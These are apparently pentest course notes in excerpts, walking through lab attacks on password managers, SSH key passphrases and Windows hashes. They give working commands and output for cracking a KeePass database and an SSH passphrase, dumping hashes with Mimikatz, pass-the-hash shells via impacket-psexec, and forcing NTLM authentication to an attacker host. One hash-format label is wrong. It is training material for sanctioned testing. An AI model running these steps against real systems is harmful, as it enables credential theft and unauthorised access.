  1227. <p>Password managers create and store passwords for different services and protect them with a master password. The master password grants access to all creds held in the manager. Users often copy-paste from the manager or use auto-fill browser function.</p>
  1228. <ul>
  1229. <li>Popular managers:<ul>
  1230. <li><a href="https://1password.com/">1Password</a></li>
  1231. <li><a href="https://keepass.info/">KeePass</a></li>
  1232. </ul>
  1233. </li>
  1234. <li>Software of this type can assist users who must maintain many, complex, passwords.</li>
  1235. <li>It can also introduce risk.</li>
  1236. </ul>
  1237. <p>We will demonstrate a common pentest scenario, where we have gained access to a client workstation running a passman. We will:</p>
  1238. <ul>
  1239. <li>Extract the passman DB.</li>
  1240. <li>Transform the file into Hashcat usable format.</li>
  1241. <li>Crack the master DB pass.</li>
  1242. </ul>
  1243. <p>Begin by connecting to SALESWK01 lab machine via RDP, assuming we have obtained the credentials, and gain access to the desktop. Once connected:</p>
  1244. <ul>
  1245. <li>Check installed programs.</li>
  1246. <li>Since we have GUI, use &quot;Apps &amp; Features&quot; Win function.</li>
  1247. <li>Win icon.</li>
  1248. <li>Apps.</li>
  1249. <li>Add or remove.</li>
  1250. <li>Then scroll the list to review installed programs.</li>
  1251. <li>We find <code>KeePass Password Safe 2.51.1</code> on system.</li>
  1252. <li>If we are unfamiliar, we should research it.</li>
  1253. <li>We discover the KeePass DB is stored as a <code>.kbdx</code> file.</li>
  1254. <li>Search the system for this extension.</li>
  1255. </ul>
  1256. <pre><code>Windows PowerShell
  1257. Copyright (C) Microsoft Corporation. All rights reserved.
  1258. ​
  1259. Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
  1260. ​
  1261. PS C:\Users\jason&gt; Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
  1262. ​
  1263. ​
  1264. Directory: C:\Users\jason\Documents
  1265. ​
  1266. ​
  1267. Mode LastWriteTime Length Name
  1268. ---- ------------- ------ ----
  1269. -a---- 5/30/2022 10:33 AM 1982 Database.kdbx
  1270. </code></pre>
  1271. <ul>
  1272. <li>User PowerShell.<ul>
  1273. <li><a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.management/get-childitem">Get-ChildItem</a></li>
  1274. </ul>
  1275. </li>
  1276. <li>Search the whole drive with <code>-Path C:\</code></li>
  1277. <li>Specify file type with <code>-Include</code></li>
  1278. <li>Get a list of files and sub dirs with <code>-File</code> and <code>-Recurse</code><ul>
  1279. <li>Silence errors and cont exec with <code>-ErrorAction</code> set to <code>SilentlyContinue</code></li>
  1280. </ul>
  1281. </li>
  1282. </ul>
  1283. <p>We find the DB in the user&#39;s Documents folder. Transfer the DB to our Kali system in preparation for the attack. Thus completing the first step of our methodology.</p>
  1284. <p>Next, tranform the has into a format our cracking tool can use.</p>
  1285. <ul>
  1286. <li>JtR suite includes various transformation scripts.<ul>
  1287. <li><a href="https://github.com/openwall/john/blob/bleeding-jumbo/run/ssh2john.py">ssh2john</a></li>
  1288. <li><a href="https://github.com/openwall/john/blob/bleeding-jumbo/src/keepass2john.c">keepass2john</a></li>
  1289. </ul>
  1290. </li>
  1291. <li>These are installed by default in Kali.</li>
  1292. <li>They can also format for Hashcat!</li>
  1293. </ul>
  1294. <p>We will use <code>keepass2john</code> to format the DB and save the output as <code>keepass.hash</code>.</p>
  1295. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1296. └─$ keepass2john Database.kdbx &gt; keepass.hash
  1297. ​
  1298. ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1299. └─$ cat keepass.hash
  1300. Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
  1301. </code></pre>
  1302. <ul>
  1303. <li>Before we can work with it, we need to modify it further.</li>
  1304. <li>The JtR script prepended the filename <code>Database</code> to the hash.</li>
  1305. <li>It does this to act as the username for the hash.</li>
  1306. <li>Helpful when cracking DB hashes as we want the output to contain the username:password pairs.</li>
  1307. <li>Since KeePass uess a master password without a username we must remove the <code>Database:</code> string.</li>
  1308. </ul>
  1309. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1310. └─$ cat keepass.hash
  1311. $keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
  1312. </code></pre>
  1313. <ul>
  1314. <li>The hash is now in the correct format for Hashcat!</li>
  1315. </ul>
  1316. <p>Now we must determine the correct hash type.</p>
  1317. <ul>
  1318. <li>To determine this hashtype.</li>
  1319. <li>We can look it up in the Hashcat wiki.</li>
  1320. <li>Or grep Hashcat help.</li>
  1321. </ul>
  1322. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1323. └─$ hashcat --help | grep -i &quot;KeePass&quot;
  1324. 13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) | Password Manager
  1325. 29700 | KeePass 1 (AES/Twofish) and KeePass 2 (AES) - keyfile only mode | Password Manager
  1326. </code></pre>
  1327. <ul>
  1328. <li>The correct mode appears to be <code>13400</code></li>
  1329. </ul>
  1330. <p>We will skip step 3, cracking time calculation, since this is a simple example.</p>
  1331. <p>Next we prepare our wordlist.</p>
  1332. <ul>
  1333. <li>We will use a Hashcat provided rule <code>rockyou-30000.rule</code></li>
  1334. <li>Combining this with the <code>rockyou.txt</code> wordlist.</li>
  1335. <li>This rule is highly effect with the rockyou wordlist as it was tailored for it.</li>
  1336. </ul>
  1337. <p>We have prepared everything and are ready to begin out attack! Run Hashcat with the requisite arguments.</p>
  1338. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1339. └─$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force

  1369. <ul>
  1370. <li>We have recovered <code>qwertyuiop123!</code></li>
  1371. <li>Run KeePass on our target system and enter the master pass when prompted.</li>
  1372. <li>We now have access to all of the user&#39;s saved passwords.</li>
  1373. </ul>

  1542. <h3>SSH Private Key Passphrases</h3>
  1543. <p>In this section we focus on cracking SSH private key passphrases. Although, SSH private keys should be kept secured there are many instances where these files may become compromised. If we were to gain access to a web application via directory traversal, we can read files on the system, in turn allowing us to retrieve a user&#39;s private SSH key. If we attempt to connect to the system and are prompted to enter a passphrase, we will need to crack it!</p>
  1544. <p>Using the cracking methodology we discussed previously, we will crack the passphrase of a private key. When we used a dict attack to gain access on the HTTP BRUTE login form, we gained access to a file manager hosting an SSH private key.</p>
  1545. <p>Let&#39;s browse another web service for this demo, VM1, and log in with user:121212. Similar to the previous TinyFileManager example, but the main dir now contains 2 files:</p>
  1546. <ul>
  1547. <li><code>id_rsa</code></li>
  1548. <li><code>notes.txt</code>
  1549. Download both to our attacking machine. First, review the <code>notes.txt</code>.</li>
  1550. </ul>
  1551. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1552. └─$ cat note.txt
  1553. Dave&#39;s password list:
  1554. ​
  1555. Window
  1556. rickc137
  1557. dave
  1558. superdave
  1559. megadave
  1560. umbrella
  1561. ​
  1562. Note to myself:
  1563. New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
  1564. </code></pre>
  1565. <ul>

  1605. </ul>
  1606. </li>

  1608. </ul>
  1609. <p>Following cracking methodology, our next step is to convert the private key into a hash format compatible with our tools.</p>

c9feb0110a67d152edbb3435a4cac029c4876b2da87a27070a39cef510706986871649241a7a9731a3a732fa0cbbf468a9da9af4670432d269d1aa334882a0e49d0c5a52f6bae655bcea2b9d39ac30e1f0c30707dd957d98c4a5f757a3ba6667761ccc736ed9b3a2d7f91c784f61a25d8ed70d6e91a7518f2fb379b0bb39cf7881a60498a9b96690d1a45d29d74d54004fc10b9f6b777ac812fb7ee4f9a74f540134870f2865d90dbde765349e0b696b56b31f8a90033029bfb6a5cc927dc3629d867a95bcf95698f4cfcebbccda7e75f1e016500c7738d38ab0a0074ee3e8b29986b2fac8251fa26db3248cff96afd5e32112da221be9aaba7ac9e8d9547cd90bb1e8b1e3594d87c96b4cff829a2d1f850f222a9b7b4bd845e4a43911f7577611536a60824fe4db5ded1e180f350cb978f5fc729c35d1b9221cb0c236178c79e90897d96a0e470406e9dc6fd93c567e89f7a6e5d037e8dcff0746a3a47f5ca41cfa8f4e028edc531695a4d165749bd57413d893c31164d304a4ec68ac15c6502b74d16b34e41a66611f2e61d0cd00e67a18e496ad8a11cf12ac1b6bed55e26112b2c9ec7ef4962c0e01e8d472b9387759b2ba2fab1ef865a6971d6f9e49c119bc4390e68ef0dd877419e9a7f2c5332656de9f3186e6f1e97ab4a0f91872ada83050d9db3e312c795890b417293bb9a151e34e05d9f4334e6794e91704e71763f2bdc0e21bf0f5dacbcd77914f6de4c70884e67f2461010bee568cf77ce32c32f5533d6d8a3e790e10f593e6bb778b027a1ed7698d1df545411b66c2027809f005e6ae036ec83e7c337a3c2eddaf967e195b464e18d6807123ed94aaf28431f7b2c62310acaf3893dc9b0d6b21e6baa6683302b8b3a311d658564525f395f882fd4d57e2232dc706c12b3354801c8a9886f1b52b17b11677d1c86d6cc037a51d7da28c8204e6e9978482a4fa816a3aeea492adc388d8f2b2f906a955e019dc178c4be6a6c06fdbbfb0084ca68ce786db4c2e9b00b4a4f842ae73c29c5581dbd1ffcbe0e4fddac5179465974e665c3ba2a4fdf1ef5aebb271f385c5a267cb5686fe1539296ea53b292cc70a04b048c99b91640d5b0f93df0817cef28d2ea1d04df2e09dab65d8660745b8248bb9c6b13de2d36f054db2897b33a194e10f0a492f3eaae1c7b73759594e3f1a5808f941e882d19f3beec856c7db925b515c76f648ab256f6f21fe61cce53bbf393c867ef8c8adf4e93cfd23dfb89408462fb60e97b910a69740ee952743d679017a32cfeadfb412288b183df308632$16$486
  1616. </code></pre>
  1617. <ul>
  1618. <li>In the output<ul>
  1619. <li><code>$6$</code> signifies <code>SHA-512</code></li>
  1620. <li>as previously done, we need to remove the filename before the first <code>:</code></li>
  1621. </ul>
  1622. </li>
  1623. <li>Then we determine the correct Hashcat mode</li>
  1624. </ul>
  1625. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1626. └─$ nano ssh.hash
  1628. ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1629. └─$ hashcat --help | grep -i &quot;ssh&quot;
  1630. 6700 | AIX {ssha1} | Operating System
  1631. 6400 | AIX {ssha256} | Operating System
  1632. 6500 | AIX {ssha512} | Operating System
  1633. 1411 | SSHA-256(Base64), LDAP {SSHA256} | FTP, HTTP, SMTP, LDAP Server
  1634. 1711 | SSHA-512(Base64), LDAP {SSHA512} | FTP, HTTP, SMTP, LDAP Server
  1635. 111 | nsldaps, SSHA-1(Base64), Netscape LDAP SSHA | FTP, HTTP, SMTP, LDAP Server
  1636. 10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1 | Enterprise Application Software (EAS)
  1637. 22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$) | Private Key
  1638. 22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$) | Private Key
  1639. 22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$) | Private Key
  1640. 22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$) | Private Key
  1641. 22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$) | Private Key
  1642. </code></pre>
  1643. <ul>
  1644. <li>output shows that mode of <code>$6$</code> is <code>22921</code></li>
  1645. </ul>
  1646. <p>Next we must prepare our rule file to comply with policy we discovered.</p>
  1647. <pre><code>Note to myself:
  1648. New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
  1649. </code></pre>
  1650. <ul>
  1651. <li>Notice that <code>dave</code> used <code>137</code> for the 3 numbers in <code>rickc137</code></li>
  1652. <li>The <code>Window</code> password starts with an upper case char</li>
  1653. <li>Create a rule function<ul>
  1654. <li>upper case first char</li>
  1655. <li>as dave has no special char in any know passwords we will use the most common <code>!@#</code></li>
  1656. <li>we will also use num <code>137</code> based on our observations</li>
  1657. </ul>
  1658. </li>
  1659. </ul>
  1660. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1661. └─$ cat ssh.rule
  1662. c $1 $3 $7 $!
  1663. c $1 $3 $7 $@
  1664. c $1 $3 $7 $#
  1665. </code></pre>
  1666. <ul>
  1667. <li>next we create a wordlist file containing the known passwords</li>
  1668. </ul>
  1669. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1670. └─$ nano ssh.passwords
  1672. ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1673. └─$ cat ssh.passwords
  1674. Window
  1675. rickc137
  1676. dave
  1677. superdave
  1678. megadave
  1679. umbrella
  1680. </code></pre>
  1681. <ul>
  1682. <li>We perform our first cracking attempt</li>
  1683. </ul>
  1684. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1685. └─$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
  1686. hashcat (v6.2.6) starting
  1687. ​
  1688. ...
  1689. Hashfile &#39;ssh.hash&#39; on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
  1690. </code></pre>
  1691. <ul>
  1692. <li>However we recieve a token len exception<ul>
  1693. <li>a Google search reveals that the modern private keys and passphrases are created with the aes-256-ctr cipher, which is unsupported by Hashcat mode <code>22921</code></li>
  1694. <li>JtR can handle this cipher</li>
  1695. </ul>
  1696. </li>
  1697. </ul>
  1698. <p>To use the rules we created with JtR we need to add a name for the rules and append them to <code>/etc/john/john.conf</code> file.</p>
  1699. <ul>
  1700. <li>we will use the name <code>sshRules</code><ul>
  1701. <li>with <code>List.Rules</code> naming sytax show below</li>
  1702. </ul>
  1703. </li>
  1704. </ul>
  1705. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1706. └─$ cat ssh.rule
  1707. [List.Rules:sshRules]
  1708. c $1 $3 $7 $!
  1709. c $1 $3 $7 $@
  1710. c $1 $3 $7 $#
  1711. ​
  1712. ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1713. └─$ sudo sh -c &#39;cat /home/operator/OffSec/password-attacks/ssh.rule &gt;&gt; /etc/john/john.conf&#39;
  1714. </code></pre>
  1715. <p>We can now use <code>john</code> to crack the passphrase as the final step of our methodology!</p>
  1716. <ul>
  1717. <li>In our <code>john</code> command<ul>
  1718. <li>define wordlist with <code>--wordlist=ssh.passwords</code></li>
  1719. <li>rules with <code>--rules=sshRules</code><ul>
  1720. <li>as appended to john conf</li>
  1721. </ul>
  1722. </li>
  1723. </ul>
  1724. </li>
  1725. </ul>
  1726. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1727. └─$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
  1728. Created directory: /home/operator/.john
  1729. Using default input encoding: UTF-8
  1730. Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
  1731. Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
  1732. Cost 2 (iteration count) is 16 for all loaded hashes
  1733. Will run 8 OpenMP threads
  1734. Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status
  1735. Umbrella137! (?)
  1736. 1g 0:00:00:00 DONE (2023-10-01 12:01) 1.538g/s 27.69p/s 27.69c/s 27.69C/s Window137!..Umbrella137#
  1737. Use the &quot;--show&quot; option to display all of the cracked passwords reliably
  1738. Session completed.
  1739. </code></pre>
  1740. <ul>
  1741. <li>We successfully crack passphrase <code>Umbrella137!</code><ul>
  1742. <li>the passphrase complies with policy but also matches dave&#39;s personal prefs</li>
  1743. <li>users rarely change their password patterns</li>
  1744. </ul>
  1745. </li>
  1746. </ul>
  1747. <p>Now we can use the passphrase to connect to the target system via SSH. (Note: created ssh config entry to specify id_rsa of this connection)</p>
  1748. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  1749. └─$ ssh dave-ssh
  1750. Enter passphrase for key &#39;/home/operator/OffSec/password-attacks/id_rsa&#39;:
  1751. Welcome to Alpine!
  1752. ​
  1753. The Alpine Wiki contains a large amount of how-to guides and general
  1754. information about administrating Alpine systems.
  1755. See &lt;http://wiki.alpinelinux.org/&gt;.
  1756. ​
  1757. You can setup the system with the command: setup-alpine
  1758. ​
  1759. You may change this message by editing /etc/motd.
  1760. ​
  1761. 8df1e0139a6f:~$
  1762. </code></pre>
  1763. <p>We have succeeded in connecting to the target system by following the methodology and applying our understanding of human behavioral patterns! We adapted to an error in our main tool, Hashcat, by using JtR.</p>

  1992. <h2>15.3 Working with Password Hashes</h2>
  1993. <ul>
  1994. <li>Obtain and crack NTLM hashes</li>
  1995. <li>Pass NTLM hashes</li>
  1996. <li>Obtain and crack Net-NTLMv2 hashes</li>
  1997. <li>Relay Net-NTLMv2 hashes</li>
  1998. </ul>
  1999. <p><em>While in most assignments we&#39;ll face an Active Directory environment, this Learning Unit only covers local Windows machines. However, the skills learned here are a stepping stone to the later Active Directory Modules in this course.</em></p>
  2000. <p>For this, we&#39;ll cover two different hash implementations on Windows: </p>
  2001. <ul>
  2002. <li><a href="https://en.wikipedia.org/wiki/NT_LAN_Manager">NT LAN Manager (NTLM)</a></li>
  2003. <li><a href="https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/5e550938-91d4-459f-b67d-75d70009e3f3">Net-NTLMv2.4</a></li>
  2004. </ul>
  2005. <h3>Cracking NTLM</h3>
  2006. <p>Windows stores hased user passwords in the <a href="https://en.wikipedia.org/wiki/Security_Account_Manager">Security Account Manager (SAM)</a> DB file, used to auth local and remote accounts.</p>
  2007. <p><em>To deter offline SAM database password attacks, Microsoft introduced the SYSKEY feature in Windows NT 4.0 SP3, which partially encrypts the SAM file. The passwords can be stored in two different hash formats: LAN Manager (LM)2 and NTLM. LM is based on DES,3 and is known to be very weak. For example, passwords are case insensitive and cannot exceed fourteen characters. If a password exceeds seven characters, it is split into two strings, each hashed separately. LM is disabled by default beginning with Windows Vista and Windows Server 2008.</em></p>
  2008. <p>On modern systems, the SAM hashes are stored as NTLM. This hash fixes many of the weaknesses of LM, i.e. passwords are case sensitive and no longer split into smaller, weaker, hashes. However, NTLM hashes stored in the SAM DB are not salted.</p>
  2009. <p><a href="https://en.wikipedia.org/wiki/Salt_(cryptography)">Salts</a> are random buts appended to a password <em>before</em> it is hashed. They are used to prevent an attack in which attackers pre-compute a list of hashes and then perform lookups on these precomputed hashes to infer the plaintext password. A list or table of precomputed passwords is called a <a href="https://en.wikipedia.org/wiki/Rainbow_table">Rainbow Table</a>, the attack is known as a Rainbow Table Attack.</p>
  2010. <p><em>We use &quot;NTLM hash&quot; to refer to the formally correct NTHash. Since &quot;NTLM hash&quot; is more commonly used in our industry, we use it in this course to avoid confusion.</em></p>
  2011. <p>We cannot perform operations on the SAM DB (copy/rename/move) in <strong>C:\Windows\system32\config\sam</strong> while Win is running, the kernel keeps and exclusive file system lock on it. However, this restriction can be bypassed with a <a href="https://github.com/gentilkiwi/mimikatz">Mimikatz</a>.</p>
  2012. <p>Mimikatz provides functions to extract plain-text passwords and password hashes, from various Win sources, and further leverage them in attack vectors like <a href="https://en.wikipedia.org/wiki/Pass_the_hash">pass-the-hash</a>. Mimikatz <strong>sekurlsa</strong> module extracts hashes from the <a href="https://en.wikipedia.org/wiki/Local_Security_Authority_Subsystem_Service">Local Security Authority Subsystem (LSASS)</a>. LSASS is a Win process that handles auth, password change, and <a href="https://docs.microsoft.com/en-us/windows/win32/secauthz/access-tokens">access tokens</a>.</p>
  2013. <p>LSASS caches NTLM hashes and other creds, which can be extracted with Mimikatz <strong>sekurlsa</strong> module. We need to understand that LSASS runs under the SYSTEM user, with higher privs than Administrator. Therefore, we can only extract passwords if we are running Mimikatz as Administrator or higher, with <a href="https://devblogs.microsoft.com/oldnewthing/20080314-00/?p=23113">SeDebugPrivilege</a>. This access right allows the debugging of processes we own and those of other users.</p>
  2014. <p>We can elevate our privs to SYSTEM with tools like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a> or Mimikatz <a href="https://github.com/gentilkiwi/mimikatz/wiki/module-~-token">token elevation function</a>. The token elevation function requires <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege">SeImpersonatePrivilege</a> access right, with all local Admin accounts have by default.</p>
  2015. <p>Now let&#39;s demonstrate how to obtain and crack NTLM hashes. We will retrieve passwords from the SAM of the MARKETINGWK01 machine, log in via RDP with the creds provided in the lab machine below.</p>

  2020. </li>
  2021. </ul>

  2590. <h3>Passing NTLM</h3>
  2591. <p>Previously we obtained NTLM hashes and cracked them, in some cases this may not be feasible due to complexity or available time. We will now demonstrate how to leverage a NTLM hash without cracking it!</p>
  2592. <ul>
  2593. <li>Pass-the-hash (PtH)<ul>
  2594. <li>can be used to authenticate to a local or remote target with a valid username and NTLM hash instead of a cleartext password.</li>
  2595. <li>possible because NTLM hashes are not salted<ul>
  2596. <li>they remain static between sessions</li>
  2597. </ul>
  2598. </li>
  2599. <li>if we obtain a password hash on one target<ul>
  2600. <li>it can be used for auth on that target</li>
  2601. <li>as well as other targets that user account has access to<ul>
  2602. <li>for code execution the account needs admin privs on that system</li>
  2603. </ul>
  2604. </li>
  2605. </ul>
  2606. </li>
  2607. </ul>
  2608. </li>
  2609. <li>if not a local Administrator user hash<ul>
  2610. <li>the target needs to be configured in a specific way to obtain code exec</li>
  2611. <li>Since Win Vista <a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/user-account-control-and-remote-restriction">UAC remote Restrictions</a> are enabled by default<ul>
  2612. <li>preventing software commands from running with administrative rights on remote systems</li>
  2613. <li>mitigating the attack for users in the administrators group aside from the local <strong>Administrator</strong> account.</li>
  2614. </ul>
  2615. </li>
  2616. </ul>
  2617. </li>
  2618. </ul>
  2619. <p>In this example assume we gained access to FILES01 and obtain the password for a user, <code>gunther:password123!</code>, then start Win Explorer and enter the path of the SMB share <code>\\192.168.X.X\secrets</code> in the nav bar. We are prompted for creds to connect to the share, enter the creds for the gunther user, and are notified that Win cannot access this share. This is due to the user account lacking permissions for the share. We can use Mimikatz to obtain the NTLM hash of Administrator as we did previously.</p>
  2620. <ul>
  2621. <li><code>./mimikatz.exe</code></li>
  2622. <li><code>privilege::debug</code></li>
  2623. <li><code>token::elevate</code></li>
  2624. <li><code>lsadump::sam</code></li>
  2625. </ul>
  2626. <pre><code class="language-powershell">PS C:\tools&gt; .\mimikatz.exe

  2797. <ul>
  2798. <li>We save <code>Administrator:7a38310ea6f0027ee955abed1762964b</code> for later use</li>
  2799. <li>to leverage PtH we need tools that support auth with NTLM hashes<ul>
  2800. <li>SMB enumeration and management<ul>
  2801. <li><a href="https://www.samba.org/samba/docs/current/man-html/smbclient.1.html">smbclient</a></li>
  2802. <li><a href="https://github.com/byt3bl33d3r/CrackMapExec">CrackMapExec</a></li>
  2803. </ul>
  2804. </li>
  2805. <li>Command exec<ul>
  2806. <li>scripts from <a href="https://github.com/SecureAuthCorp/impacket">impacket</a><ul>
  2807. <li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/psexec.py">psexec.py</a></li>
  2808. <li><a href="https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py">wmiexec.py</a></li>
  2809. </ul>
  2810. </li>
  2811. </ul>
  2812. </li>
  2813. <li>We can also utilize the hash with protocols other than SMB<ul>
  2814. <li>RDP</li>
  2815. <li><a href="https://docs.microsoft.com/en-us/windows/win32/winrm/portal">WinRM</a></li>
  2816. </ul>
  2817. </li>
  2818. <li>If the user has the proper privs Mimikatz can PtR as well</li>
  2819. </ul>
  2820. </li>
  2821. </ul>
  2822. <p>Since the goal of this example is to gain access to a SMB share with a NTLM hash, we will use <strong>smbclient</strong>.</p>
  2823. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  2824. └─$ smbclient \\\\192.168.218.212\\secrets -U Administrator --pw-nt-hash 7a38310ea6f0027ee955abed1762964b
  2825. Try &quot;help&quot; to get a list of possible commands.
  2826. smb: \&gt; dir
  2827. . D 0 Thu Jun 2 13:55:37 2022
  2828. .. DHS 0 Mon Oct 2 17:37:03 2023
  2829. secrets.txt A 16 Thu Sep 1 09:23:32 2022
  2830. ​
  2831. 4554239 blocks of size 4096. 1601367 blocks available
  2832. smb: \&gt; get secrets.txt
  2833. getting file \secrets.txt of size 16 as secrets.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
  2834. </code></pre>
  2835. <ul>
  2836. <li>After connecting<ul>
  2837. <li>we can list files with <code>dir</code></li>
  2838. <li>and user the <code>get</code> command to download files</li>
  2839. </ul>
  2840. </li>
  2841. </ul>
  2842. <p>In the next example we will use a NTLM hash to obtain and interactive shell. We have a variety of tools available to us for this purpose, but here we will utilize <code>psexec.py</code> from the <strong>impacket</strong> library.</p>
  2843. <ul>
  2844. <li>Similar to the Sysinternals <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/psexec">PsExec</a><ul>
  2845. <li>it searches for a writable share and uploads an executable</li>
  2846. <li>it then registers the exe as a service and starts it<ul>
  2847. <li>often allowing us to obtain and interactive shell or code exec</li>
  2848. </ul>
  2849. </li>
  2850. </ul>
  2851. </li>
  2852. <li>On Kali we will use <a href="https://www.kali.org/tools/impacket-scripts/">impacket-scripts</a> to execute <code>psexec.py</code><ul>
  2853. <li>The package contains links to the example scripts of impacket lib</li>
  2854. <li>provides a user friendly way to use them</li>
  2855. </ul>
  2856. </li>
  2857. <li>To exec <code>psexec</code><ul>
  2858. <li>enter <code>impacket-psexec</code><ul>
  2859. <li>takes two args<ul>
  2860. <li>NTLM hash with <code>-hashes</code><ul>
  2861. <li>format <code>LMHash:NTHash</code><ul>
  2862. <li>Specify the Administrator NTLM hash after the colon</li>
  2863. <li>We do not use the LMHash and will fill the section with 32* <code>0</code></li>
  2864. </ul>
  2865. </li>
  2866. </ul>
  2867. </li>
  2868. <li>The next arg determines the command psexec will execute on the target system<ul>
  2869. <li>Leave it blank to exec <code>cmd.exe</code> providing an interactive shell</li>
  2870. </ul>
  2871. </li>
  2872. </ul>
  2873. </li>
  2874. </ul>
  2875. </li>
  2876. </ul>
  2877. </li>
  2878. </ul>
  2879. <pre><code class="language-bash">┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  2880. └─$ export VM1=&#39;192.168.235.212&#39;
  2882. ┌──(operator㉿labhost)-[~/OffSec/password-attacks]
  2883. └─$ impacket-psexec -hashes 00000000000000000000000000000000:7a38310ea6f0027ee955abed1762964b Administrator@$VM1

  2918. <ul>
  2919. <li>We obtained a shell as the <em>Administrator</em> user with <em>wmiexec</em> instead of <em>SYSTEM</em></li>
  2920. </ul>
  2921. <p>In this section we used PtR to gain access to a SMB share and to obtain an interactive shell with <code>impacket-psexec</code> and <code>impacket-wmiexec</code></p>
  2922. <h3>Cracking Net-NTLMv2</h3>
  2923. <p>In some engagements we may obtain code exec or a shell on a Win system as an unpriv user, in this case we are unable to use tools like Mimikatz to extract passwords or NTLM hashes. We are able to abuse Net-NTLMv2 network auth proto, which is responsible for managing Win client and server auth over a network.</p>
  2924. <p><em>We use &quot;Net-NTLMv2&quot; to refer to the formally correct NTLMv2. Since &quot;Net-NTLMv2&quot; is more commonly used in our industry, we use it in this course to avoid confusion.</em></p>
  2925. <p>This example will walk through the basics of the auth process, our goal will be to gain access to a SMB share of a Win 2022 server from a Win 11 client via Net-NTLMv2.</p>
  2926. <p>Our goal is to utilize Net-NTLMv2 which is less secure than the more modern <a href="https://en.wikipedia.org/wiki/Kerberos_(protocol)">Kerberos</a> proto, which is common in real world since many environments rely on the older proto as a way to support older devices.</p>
  2927. <p>We will find Net-NTLMv2 in almost all Win networks so it is vital for us to understand how we can leverage it&#39;s weaknesses. We need our target system to start an auth process using Net-NTLMv2 against the system we control. We will need to prepare our system to handle the auth process and show us the Net-NTLMv2 hash the target used to auth.</p>
  2928. <p>An excellent tool for this purpose is <a href="https://github.com/lgandx/Responder">Responder</a> which includes a built-in SMB server, that handles the auth process, and prints out the captured Net-NTLMv2 hashes. It also handles other proto servers including HTTP, FTP, as well as <a href="https://en.wikipedia.org/wiki/Link-Local_Multicast_Name_Resolution">Link-Local Multicast Name Resolution (LLMNR)</a>, <a href="https://en.wikipedia.org/wiki/NetBIOS">NetBIOS Name Service (NBT-NS)</a>, and <a href="https://en.wikipedia.org/wiki/Multicast_DNS">Multicast DNS (MDNS)</a> poisoning capabilities.</p>
  2929. <p>We will focus on capturing Net-NTLMv2 hashes with the SMB server in this section.</p>
  2930. <p>If we have code exec on a remote system we can easily force it to auth with us by commanding it to connect to our prepared SMB server. For example:</p>
  2931. <ul>
  2932. <li>In PowerShell on the remote systems<ul>
  2933. <li>run <code>ls \\{OurAttackingIP}\share</code>
  2934. If we do not have code exec we can use other vectors to force auth. For example:</li>
  2935. </ul>
  2936. </li>
  2937. <li>If we discover an upload form in a web app on a Win server<ul>
